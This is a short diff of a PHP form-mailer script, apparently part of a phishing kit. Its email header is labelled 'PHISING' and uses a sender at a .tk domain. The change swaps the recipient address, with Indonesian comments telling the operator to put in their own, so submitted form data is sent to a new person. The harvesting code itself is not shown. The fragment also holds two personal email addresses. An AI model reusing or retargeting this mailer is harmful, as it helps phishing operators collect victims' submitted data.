@@ -1,6 +1,6 @@
 <?php
 if($_POST['kirim']){
-	$admin = 'satria.bagus18@gmail.com'; //ganti email dg email admin (email penerima pesan)
+	$admin = 'arinurrahman37@gmail.com'; //ganti email dg email admin (email penerima pesan)
 	$judul	= 'GMNI LITERATION FAIR 2018'; //judul email
 	$headers = 'From: admin@pure-five.tk ' . ' PHISING ' . "\r\n" . '===================================='; //header isi email
 
